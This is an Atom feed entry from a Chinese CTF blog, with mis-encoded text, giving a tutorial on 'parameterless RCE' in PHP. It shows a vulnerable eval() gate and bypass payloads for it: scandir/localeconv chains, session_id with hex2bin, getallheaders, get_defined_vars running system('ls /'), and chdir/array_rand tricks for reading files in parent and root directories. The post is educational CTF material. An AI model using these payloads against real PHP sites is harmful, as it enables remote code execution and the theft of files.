<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>æ¢¦~é†’ğŸ¥</title>
  
  
  <link href="https://blog.m3x1.cn/atom.xml" rel="self"/>
  
  <link href="https://blog.m3x1.cn/"/>
  <updated>2025-04-16T13:28:29.150Z</updated>
  <id>https://blog.m3x1.cn/</id>
  
  <author>
    <name>æ¢¦~é†’ğŸ¥</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>æ— å‚æ•°rceè¯¦è§£</title>
    <link href="https://blog.m3x1.cn/posts/7d0cf4ae.html"/>
    <id>https://blog.m3x1.cn/posts/7d0cf4ae.html</id>
    <published>2025-04-15T16:00:00.000Z</published>
    <updated>2025-04-16T13:28:29.150Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="æ— å‚æ•°RCEé¢˜ç›®ç‰¹å¾">æ— å‚æ•°RCEé¢˜ç›®ç‰¹å¾</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(&#x27;;&#x27; === preg_replace(&#x27;/[^\W]+\((?R)?\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;star&#x27;])) &#123;    </span><br><span class="line">    eval($_GET[&#x27;star&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­£åˆ™è¡¨è¾¾å¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[^\W]+\((?R)?\) </span><br></pre></td></tr></table></figure><p>åŒ¹é…äº†ä¸€ä¸ªæˆ–å¤šä¸ªéæ ‡ç‚¹ç¬¦å·å­—ç¬¦ï¼ˆè¡¨ç¤ºå‡½æ•°åï¼‰ï¼Œåè·Ÿä¸€ä¸ªæ‹¬å·ï¼ˆè¡¨ç¤ºå‡½æ•°è°ƒç”¨ï¼‰ã€‚å…¶ä¸­ (?R) æ˜¯é€’å½’å¼•ç”¨ï¼Œå®ƒåªèƒ½åŒ¹é…å’Œæ›¿æ¢åµŒå¥—çš„å‡½æ•°è°ƒç”¨ï¼Œè€Œä¸èƒ½å¤„ç†å‡½æ•°å‚æ•°ã€‚ä½¿ç”¨è¯¥æ­£åˆ™è¡¨è¾¾å¼è¿›è¡Œæ›¿æ¢åï¼Œæ¯ä¸ªå‡½æ•°è°ƒç”¨éƒ½ä¼šè¢«åˆ é™¤ï¼Œåªå‰©ä¸‹ä¸€ä¸ªåˆ†å· ;ï¼Œè€Œæœ€ç»ˆç»“æœå¼ºç­‰äºï¼›æ—¶ï¼Œpayloadæ‰èƒ½è¿›è¡Œä¸‹ä¸€æ­¥ã€‚ç®€è€Œè¨€ä¹‹ï¼Œæ— å‚æ•°rceå°±æ˜¯ä¸ä½¿ç”¨å‚æ•°ï¼Œè€Œåªä½¿ç”¨ä¸€ä¸ªä¸ªå‡½æ•°æœ€ç»ˆè¾¾åˆ°ç›®çš„ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">scandir()å¯ä»¥ä½¿ç”¨é‡Œé¢ä¸å«å‚æ•°</span><br><span class="line">scandir(&#x27;1&#x27;)ä¸å¯ä»¥ä½¿ç”¨ï¼Œé‡Œé¢å«æœ‰å‚æ•°1ï¼Œæ— æ³•è¢«æ›¿æ¢åˆ é™¤</span><br></pre></td></tr></table></figure><h2 id="ç›¸å…³å‡½æ•°ç®€è¦ä»‹ç»">ç›¸å…³å‡½æ•°ç®€è¦ä»‹ç»</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">scandir() :å°†è¿”å›å½“å‰ç›®å½•ä¸­çš„æ‰€æœ‰æ–‡ä»¶å’Œç›®å½•çš„åˆ—è¡¨ã€‚è¿”å›çš„ç»“æœæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œå…¶ä¸­åŒ…å«å½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å’Œç›®å½•åç§°ï¼ˆglob()å¯æ›¿æ¢ï¼‰</span><br><span class="line">localeconv() ï¼šè¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚ï¼ˆä½†æ˜¯è¿™é‡Œæ•°ç»„ç¬¬ä¸€é¡¹å°±æ˜¯â€˜.â€™ï¼Œè¿™ä¸ª.çš„ç”¨å¤„å¾ˆå¤§ï¼‰</span><br><span class="line">current() ï¼šè¿”å›æ•°ç»„ä¸­çš„å•å…ƒï¼Œé»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼ã€‚pos()å’Œcurrent()æ˜¯åŒä¸€ä¸ªä¸œè¥¿</span><br><span class="line">getcwd() :å–å¾—å½“å‰å·¥ä½œç›®å½•</span><br><span class="line">dirname():å‡½æ•°è¿”å›è·¯å¾„ä¸­çš„ç›®å½•éƒ¨åˆ†</span><br><span class="line">array_flip() :äº¤æ¢æ•°ç»„ä¸­çš„é”®å’Œå€¼ï¼ŒæˆåŠŸæ—¶è¿”å›äº¤æ¢åçš„æ•°ç»„</span><br><span class="line">array_rand() :ä»æ•°ç»„ä¸­éšæœºå–å‡ºä¸€ä¸ªæˆ–å¤šä¸ªå•å…ƒ</span><br><span class="line">array_reverse():å°†æ•°ç»„å†…å®¹åè½¬</span><br><span class="line">strrev():ç”¨äºåè½¬ç»™å®šå­—ç¬¦ä¸²</span><br><span class="line">getcwd()ï¼šè·å–å½“å‰å·¥ä½œç›®å½•è·¯å¾„</span><br><span class="line">dirname() ï¼šå‡½æ•°è¿”å›è·¯å¾„ä¸­çš„ç›®å½•éƒ¨åˆ†ã€‚</span><br><span class="line">chdir() ï¼šå‡½æ•°æ”¹å˜å½“å‰çš„ç›®å½•ã€‚</span><br><span class="line">eval()ã€assert()ï¼šå‘½ä»¤æ‰§è¡Œ</span><br><span class="line">hightlight_file()ã€show_source()ã€readfile()ï¼šè¯»å–æ–‡ä»¶å†…å®¹</span><br></pre></td></tr></table></figure><p>ä¸¾ä¸ªä¾‹å­scandir(â€˜.â€™)æ˜¯è¿”å›å½“å‰ç›®å½•,è™½ç„¶æˆ‘ä»¬æ— æ³•ä¼ å‚ï¼Œä½†æ˜¯ç”±äºlocaleconv() è¿”å›çš„æ•°ç»„ç¬¬ä¸€ä¸ªå°±æ˜¯â€˜.â€™ï¼Œcurrent()å–ç¬¬ä¸€ä¸ªå€¼ï¼Œé‚£ä¹ˆcurrent(localeconv())å°±èƒ½æ„é€ ä¸€ä¸ªâ€˜.â€™,é‚£ä¹ˆä»¥ä¸‹å°±æ˜¯ä¸€ä¸ªç®€å•çš„è¿”å›æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹æ–‡ä»¶çš„payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?å‚æ•°=var_dump(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure><p>æ•°ç»„ç§»åŠ¨æ“ä½œï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">end() ï¼š å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º</span><br><span class="line">next() ï¼šå°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º</span><br><span class="line">prev() ï¼šå°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸Šä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º</span><br><span class="line">reset() ï¼š å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º</span><br><span class="line">each() ï¼š è¿”å›å½“å‰å…ƒç´ çš„é”®åå’Œé”®å€¼ï¼Œå¹¶å°†å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨</span><br></pre></td></tr></table></figure><h2 id="æ–¹æ³•ä¸€ï¼šscandir-æœ€å¸¸è§„çš„é€šè§£">æ–¹æ³•ä¸€ï¼šscandir() æœ€å¸¸è§„çš„é€šè§£</h2><p>ä»¥è¿™é“é¢˜ä¸ºä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">echo &quot;flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;&quot;;</span><br><span class="line">if(isset($_GET[&#x27;exp&#x27;]))&#123;</span><br><span class="line">    if (!preg_match(&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">        if(&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\((?R)?\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">            if (!preg_match(&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">                // echo $_GET[&#x27;exp&#x27;];</span><br><span class="line">                @eval($_GET[&#x27;exp&#x27;]);</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                die(&quot;è¿˜å·®ä¸€ç‚¹å“¦ï¼&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&quot;å†å¥½å¥½æƒ³æƒ³ï¼&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€çœ¼çœ‹è§ç¬¬äºŒä¸ªifè¯­å¥ï¼Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+(?R)?</span><br><span class="line">/&#x27;, NULL, $_GET[&#x27;exp&#x27;]))</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºè¿™æ˜¯å…¸å‹çš„æ— å‚æ•°rce,ç„¶åæ˜¯åé¢çš„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (!preg_match(&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;, $_GET[&#x27;exp&#x27;])</span><br></pre></td></tr></table></figure><p>ï¼Œè¿™é‡Œé™åˆ¶äº†phpinfo()ï¼Œgetcwd()è¿™äº›å‡½æ•°ç”¨ä¸äº†</p><p>æœ€ç»ˆpayloadä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=highligth_file(next(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥é€ä¸ªè§£æï¼Œ1ã€ è¿™é‡Œçš„var_dump(localeconv());æˆ‘ä»¬èƒ½çœ‹è§ç¬¬ä¸€ä¸ªstring[1]å°±æ˜¯ä¸€ä¸ªâ€œ.â€ï¼Œè¿™ä¸ªç‚¹æ˜¯ç”±localeconv()äº§ç”Ÿçš„</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/5b0dde18c80cb9f861cca7cb0cb0655f.png" alt="img"></p><p>åˆ©ç”¨<code>current()</code>å‡½æ•°å°†è¿™ä¸ªç‚¹å–å‡ºæ¥çš„ï¼Œ<code>â€˜.â€™</code>ä»£è¡¨çš„æ˜¯å½“å‰ç›®å½•ï¼Œé‚£æ¥ä¸‹æ¥å°±å¾ˆå¥½ç†è§£äº†ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‚¹å®Œæˆéå†ç›®å½•çš„æ“ä½œï¼Œç›¸å½“äºå°±æ˜¯<code>linux</code>ä¸­çš„<code>ls</code>æŒ‡ä»¤</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/1d2183f71c52b8a32182f0161730b15a.png" alt="img"></p><p>æ—¢ç„¶current()å–ç¬¬ä¸€ä¸ªå€¼ï¼Œé‚£ä¹ˆcurrent(localeconv())æ„é€ ä¸€ä¸ª<code>â€˜.â€™,*è€Œ'.'</code> è¡¨ç¤ºå½“å‰ç›®å½•ï¼Œ<code>scandir('.')</code> å°†è¿”å›å½“å‰ç›®å½•ä¸­çš„æ–‡ä»¶å’Œå­ç›®å½•ï¼Œè¿™é‡Œæˆ‘ä»¬å¾—çŸ¥flagæ‰€åœ¨çš„æ–‡ä»¶åå°±æ˜¯flag.php</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/4a96e96dda6d182427841d667b5811b6.png" alt="img"></p><p>ç„¶è€Œflagçš„æ–‡ä»¶ååœ¨æ¯”è¾ƒåç«¯æˆ‘ä»¬å¯ä»¥é€šè¿‡array_reverse()å°†æ•°ç»„å†…å®¹åè½¬ï¼Œè®©å®ƒä»å€’æ•°ç¬¬äºŒçš„ä½ç½®å˜æˆæ­£æ•°ç¬¬äºŒ</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/a0777df5f314e9b3cb7bc663dad6e7cc.png" alt="img"></p><p>ç§»åŠ¨æŒ‡é’ˆè¯»å–ç¬¬äºŒä¸ªæ•°ç»„ï¼Œå‚ç…§ä¸‹åˆ—æ•°ç»„ç§»åŠ¨æ“ä½œå¯çŸ¥æˆ‘ä»¬åº”é€‰ç”¨next()å‡½æ•°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">end() ï¼š å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º</span><br><span class="line">next() ï¼šå°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º</span><br><span class="line">prev() ï¼šå°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸Šä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º</span><br><span class="line">reset() ï¼š å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º</span><br><span class="line">each() ï¼š è¿”å›å½“å‰å…ƒç´ çš„é”®åå’Œé”®å€¼ï¼Œå¹¶å°†å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨</span><br></pre></td></tr></table></figure><p>æœ€åç”¨highlight_file()è¿”å›æ–‡ä»¶å†…å®¹</p><p>ä½¿ç”¨æœ€å¤šæœ€çµæ´»çš„ä¸€ä¸ªå‡½æ•°,å¯ä»¥æ„é€ å‡ºä¸åŒç”¨æ³•ï¼Œè¿™é‡Œç›´æ¥å¼•ç”¨äº†åˆ«äººçš„payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(array_rand(array_flip(scandir(getcwd())))); //æŸ¥çœ‹å’Œè¯»å–å½“å‰ç›®å½•æ–‡ä»¶</span><br><span class="line">print_r(scandir(dirname(getcwd()))); //æŸ¥çœ‹ä¸Šä¸€çº§ç›®å½•çš„æ–‡ä»¶</span><br><span class="line">print_r(scandir(next(scandir(getcwd()))));  //æŸ¥çœ‹ä¸Šä¸€çº§ç›®å½•çš„æ–‡ä»¶</span><br><span class="line">show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd()))))))); //è¯»å–ä¸Šçº§ç›®å½•æ–‡ä»¶</span><br><span class="line">show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));//è¯»å–ä¸Šçº§ç›®å½•æ–‡ä»¶</span><br><span class="line">show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));//è¯»å–ä¸Šçº§ç›®å½•æ–‡ä»¶</span><br><span class="line">show_source(array_rand(array_flip(scandir(chr(current(localtime(time(chdir(next(scandir(current(localeconv()))))))))))));//è¿™ä¸ªå¾—çˆ†ç ´ï¼Œä¸ç„¶æ‰‹åŠ¨è¦åˆ·æ–°å¾ˆä¹…ï¼Œå¦‚æœæ–‡ä»¶æ˜¯æ­£æ•°æˆ–å€’æ•°ç¬¬ä¸€ä¸ªç¬¬äºŒä¸ªæœ€å¥½ä¸è¿‡äº†ï¼Œç›´æ¥å®šä½</span><br><span class="line">  //æŸ¥çœ‹å’Œè¯»å–æ ¹ç›®å½•æ–‡ä»¶</span><br><span class="line">  //æŸ¥çœ‹å’Œè¯»å–æ ¹ç›®å½•æ–‡ä»¶</span><br></pre></td></tr></table></figure><h2 id="æ–¹æ³•äºŒï¼šsession-id">æ–¹æ³•äºŒï¼šsession_id()</h2><p>ä½¿ç”¨æ¡ä»¶ï¼šå½“è¯·æ±‚å¤´ä¸­æœ‰cookieæ—¶ï¼ˆæˆ–è€…èµ°æŠ•æ— è·¯æ‰‹åŠ¨æ·»åŠ cookieå¤´ä¹Ÿè¡Œï¼Œæœ‰äº›CTFé¢˜ä¸ä¼šå¡ï¼‰</p><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦å¼€å¯session_start()æ¥ä¿è¯session_id()çš„ä½¿ç”¨ï¼Œsession_idå¯ä»¥ç”¨æ¥è·å–å½“å‰ä¼šè¯IDï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒå¯ä»¥æŠ“å–PHPSESSIDåé¢çš„ä¸œè¥¿ï¼Œä½†æ˜¯phpsessionä¸å…è®¸()å‡ºç°</p><h3 id="æ³•ä¸€ï¼šhex2binï¼ˆï¼‰">æ³•ä¸€ï¼šhex2binï¼ˆï¼‰</h3><p>æˆ‘ä»¬è‡ªå·±æ‰‹åŠ¨å¯¹å‘½ä»¤è¿›è¡Œåå…­è¿›åˆ¶ç¼–ç ï¼Œåé¢åœ¨ç”¨å‡½æ•°hex2bin()è§£ç è½¬å›å»ï¼Œä½¿å¾—åç«¯å®é™…æ¥æ”¶åˆ°çš„æ˜¯æ¶æ„ä»£ç ã€‚æˆ‘ä»¬æŠŠæƒ³è¦æ‰§è¡Œçš„å‘½ä»¤è¿›è¡Œåå…­è¿›åˆ¶ç¼–ç åï¼Œæ›¿æ¢æ‰â€˜Cookie:PHPSESSID=â€™åé¢çš„å€¼</p><p>ä»¥ä¸‹æ˜¯åå…­è¿›åˆ¶ç¼–ç è„šæœ¬ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$encoded = bin2hex(&quot;phpinfo();&quot;);</span><br><span class="line">echo $encoded;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°phpinfo();çš„åå…­è¿›åˆ¶ç¼–ç ï¼Œå³706870696e666f28293b</p><p>é‚£ä¹ˆpayloadå°±å¯ä»¥æ˜¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?å‚æ•°=eval(hex2bin(session_id(session_start())));</span><br></pre></td></tr></table></figure><p>åŒæ—¶æ›´æ”¹cookieåçš„å€¼ä¸ºæƒ³æ‰§è¡Œçš„å‘½ä»¤çš„åå…­è¿›åˆ¶ç¼–ç </p><h3 id="æ³•äºŒï¼šè¯»æ–‡ä»¶">æ³•äºŒï¼šè¯»æ–‡ä»¶</h3><p>ä¾‹é¢˜ä¾ç„¶æ˜¯[GXYCTF2019]ç¦æ­¢å¥—å¨ƒï¼Œåœ¨çŸ¥é“æ–‡ä»¶åä¸ºflag.phpçš„æƒ…å†µä¸‹ç›´æ¥è¯»æ–‡ä»¶</p><p>å¦‚æœå·²çŸ¥æ–‡ä»¶åï¼ŒæŠŠæ–‡ä»¶åå†™åœ¨PHPSESSIDåé¢ï¼Œæ„é€ payloadä¸ºï¼š</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(<span class="name">session_id</span>(<span class="name">session_start</span>()))<span class="comment">;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/e0cfb0b1614b4ebe1e498d3eb7be1dc5.png" alt="img"></p><h2 id="æ–¹æ³•ä¸‰ï¼šgetallheaders">æ–¹æ³•ä¸‰ï¼šgetallheaders()</h2><p>getallheaders()è¿”å›å½“å‰è¯·æ±‚çš„æ‰€æœ‰è¯·æ±‚å¤´ä¿¡æ¯ï¼Œå±€é™äºApacheï¼ˆapache_request_headers()å’Œgetallheaders()åŠŸèƒ½ç›¸ä¼¼ï¼Œå¯äº’ç›¸æ›¿ä»£ï¼Œä¸è¿‡ä¹Ÿæ˜¯å±€é™äºApacheï¼‰</p><p>å½“ç¡®å®šèƒ½å¤Ÿè¿”å›æ—¶ï¼Œæˆ‘ä»¬å°±èƒ½åœ¨æ•°æ®åŒ…æœ€åä¸€è¡ŒåŠ ä¸Šä¸€ä¸ªè¯·æ±‚å¤´ï¼Œå†™å…¥æ¶æ„ä»£ç ï¼Œå†ç”¨end()å‡½æ•°æŒ‡å‘æœ€åä¸€ä¸ªè¯·æ±‚å¤´ï¼Œä½¿å…¶æ‰§è¡Œï¼Œpayloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(end(getallheaders()));</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/cef354759e2a98a3ee1d8f083684f7c8.png" alt="img"></p><p>skyæ˜¯è‡ªå·±æ·»åŠ çš„è¯·æ±‚å¤´ï¼Œ end()æŒ‡å‘æœ€åä¸€è¡Œçš„skyåçš„ä»£ç ï¼Œè¾¾åˆ°phpinfoçš„ç›®çš„ï¼Œç„¶åå¯ä»¥è¿›ä¸€æ­¥å»rceã€‚</p><h2 id="æ–¹æ³•å››ï¼šget-defined-vars">æ–¹æ³•å››ï¼šget_defined_vars()</h2><p>ç›¸è¾ƒäºgetallheadersï¼ˆï¼‰æ›´åŠ å…·æœ‰æ™®éæ€§ï¼Œå®ƒå¯ä»¥å›æ˜¾å…¨å±€å˜é‡$_GETã€$_POSTã€$_FILESã€$_COOKIEï¼Œ</p><p>è¿”å›æ•°ç»„é¡ºåºä¸º$_GETâ€“&gt;$_POSTâ€“&gt;$_COOKIEâ€“&gt;$_FILES</p><p>é¦–å…ˆç¡®è®¤æ˜¯å¦æœ‰å›æ˜¾ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(get_defined_vars());</span><br></pre></td></tr></table></figure><p>å‡å¦‚è¯´åŸæœ¬åªæœ‰ä¸€ä¸ªå‚æ•°aï¼Œé‚£ä¹ˆå¯ä»¥å¤šåŠ ä¸€ä¸ªå‚æ•°bï¼Œåé¢å†™å…¥æ¶æ„è¯­å¥ï¼Œpayloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=eval(end(current(get_defined_vars())));&amp;b=system(&#x27;ls /&#x27;);</span><br></pre></td></tr></table></figure><p>æŠŠevalæ¢æˆassertä¹Ÿè¡Œ ï¼Œèƒ½æ‰§è¡Œsystem(â€˜ls /â€™)å°±è¡Œ</p><h2 id="æ–¹æ³•äº”ï¼šchdir-array-rand-èµŒç‹—è¯»æ–‡ä»¶">æ–¹æ³•äº”ï¼šchdir()&amp;array_rand()èµŒç‹—è¯»æ–‡ä»¶</h2><p>å®åœ¨æ— æ³•rceï¼Œå¯ä»¥è€ƒè™‘ç›®å½•éå†è¿›è¡Œæ–‡ä»¶è¯»å–</p><p>åˆ©ç”¨getcwd()è·å–å½“å‰ç›®å½•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(getcwd());</span><br></pre></td></tr></table></figure><p>ç»“åˆdirname()åˆ—å‡ºå½“å‰å·¥ä½œç›®å½•çš„çˆ¶ç›®å½•ä¸­çš„æ‰€æœ‰æ–‡ä»¶å’Œç›®å½•:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(scandir(dirname(getcwd())));</span><br></pre></td></tr></table></figure><p>è¯»ä¸Šä¸€çº§æ–‡ä»¶åï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?code=show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));</span><br><span class="line"></span><br><span class="line">?code=show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));</span><br><span class="line"></span><br><span class="line">?code=show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));</span><br></pre></td></tr></table></figure><p>è¯»æ ¹ç›®å½•:</p><p>ord() å‡½æ•°å’Œ chr() å‡½æ•°ï¼šåªèƒ½å¯¹ç¬¬ä¸€ä¸ªå­—ç¬¦è¿›è¡Œè½¬ç ï¼Œord() ç¼–ç ï¼Œchr)è§£ç ï¼Œæœ‰æ¦‚ç‡ä¼šè§£ç å‡ºæ–œæ è¯»å–æ ¹ç›®å½•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=print_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));</span><br></pre></td></tr></table></figure><p>è¦ç”¨chdir()å›ºå®šï¼Œpayloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=show_source(array_rand(array_flip(scandir(dirname(chdir(chr(ord(strrev(crypt(serialize(array() )))))))))));</span><br></pre></td></tr></table></figure><p>é€šè¿‡bpçš„intruderæ¨¡å—æ¥è¯»åˆ°æ ¹ç›®å½•ï¼š</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/3a5510a74a3c76ab9dcea730917d6354.jpeg" alt="img"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/525664d020356da4d350ab1ce8a35867.jpeg" alt="img"></p><blockquote><p>å‚è€ƒæ¥æºï¼š<a href="https://blog.csdn.net/2301_76690905/article/details/133808536">æ— å‚æ•°RCEç»•è¿‡çš„è¯¦ç»†æ€»ç»“ï¼ˆå…­ç§æ–¹æ³•ï¼‰_æ— å‚æ•°çš„å–årce-CSDNåšå®¢</a></p></blockquote>]]></content>
    
    
    <summary type="html">ğŸ¥§æ— å‚æ•°rceè¯¦è§£ï¼›æ— å‚æ•°rceçš„å‡ ç§æ–¹æ³•ï¼›æ— å‚æ•°rceçš„é¢˜ç›®ç‰¹å¾åŠæ“ä½œ</summary>
    
    
    
    <category term="CTF" scheme="https://blog.m3x1.cn/categories/CTF/"/>
    
    
    <category term="webå§¿åŠ¿" scheme="https://blog.m3x1.cn/tags/web%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
